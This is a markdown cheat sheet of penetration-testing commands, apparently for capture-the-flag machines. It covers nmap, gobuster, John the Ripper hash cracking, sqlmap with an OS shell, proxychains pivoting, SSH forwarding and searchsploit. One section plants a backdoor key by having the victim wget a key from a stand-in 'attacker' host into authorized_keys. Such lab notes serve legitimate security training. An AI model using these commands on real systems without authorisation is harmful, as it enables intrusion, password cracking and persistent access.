Commands for tools used 
---

## nmap

```
scan and show OS
---
nmap <addr> -sV

Don't ping (Firewall)
---
nmap <addr> -Pn

UDP
---
nmap <addr> -sU
```


## Gobuster
for enumerating website paths

```
finding dirs
---
gobuster dir -u <addr> -w /usr/share/wordlist/dirb/common.txt


searching for specific file type + dirs
---
gobuster dir -x php -u 10.129.255.70 -w /usr/share/wordlists/dirb/common.txt
```


## John the ripper

```
cracking a zipfile
---
zip2john <file.zip> 2>/dev/null | tee <file.hash>

normal hash cracking
---
john <file.hash> --wordlist=/usr/share/wordlists/rockyou.txt --format=<format>

mangle variations of a known password
---
john key.hash --rules <known passwords> --wordlist=/usr/share/wordlists/rockyou.txt
```


## sqlmap

```
sqlmap -u "<url>" --cookie="<key=values>" --os-shell --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" 
```

## cadaver

```
For WebDAV applications
---
cadaver <website>
```

## Proxy chains

```
adding a proxy
---

edit /etc/proxychains4.conf 

examples:
http <ip> <port>
socks5 <victim service> <victim port> <user> <password>

$ proxychains ssh user@<ip>
```

## netcat enumeration

```
finding open ports internally
---
nc -zv 192.168.0.1 1-65535 2>&1 | grep -v "refused"
```


## tftp

allows putting/getting of files without specifying permission

check for `/etc/default/tftpd-hpa`


## SSH port forwarding

append your pub key to `/home/user/.ssh/authorized_keys`

On your attacker machine:

`ssh -L <local port>:<victim service>:<victim port> <victim>@<ip>`

OR using dynamic forwarding for attacks

`ssh -D <local port> <victim>@<ip>`

## Adding your SSH to the victim
```
Append your public to the victim's ~/.ssh/authorized_keys
---
On attacker:
ssh-keygen

On victim:
wget http://attacker/id_rsa.pub
cat id_rsa.pub >> ~/.ssh/authorized_keys
```

## Getting Crash Data

```
While program is running, kill it with
---
kill -BUS <pid>

Get the data from the crash log
---
apport-unpack /var/crash/_opt_count.1000.crash /tmp/crashed
strings /tmp/crashed/CoreDump
```

## JWT generation

```
pip install pyjwt

>>> import jwt
>>> encoded_jwt = jwt.encode({"some": "payload"}, "secret", algorithm="HS256")
```

## SUBDOMAIN ENUM

```
wfuzz -w SecLists-master/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.nunchucks.htb"  -u 'https://nunchucks.htb' --hh <word size>
```

## MySQL

run one liner mysqls
```
mysql -u <user> <db> --password=<pass> -e 'select * from users;'
```

## Searchsploit

Searches for exploits for specific versions

Can filter by date too

```
searchsploit -j <name of software> | jq .
```
